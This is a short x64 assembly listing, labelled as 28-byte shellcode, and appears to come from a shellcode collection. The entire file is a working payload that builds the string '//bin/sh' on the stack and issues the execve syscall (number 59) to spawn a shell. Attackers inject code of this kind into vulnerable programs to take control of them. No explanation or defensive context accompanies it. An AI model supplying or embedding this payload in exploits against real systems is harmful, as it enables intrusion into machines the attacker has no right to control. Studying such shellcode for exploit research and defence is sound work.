; x64 (LE) Shellcode / 28 bytes

BITS 64
    xor rax, rax
    push rax
    mov rdi, '//bin/sh'
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59
    syscall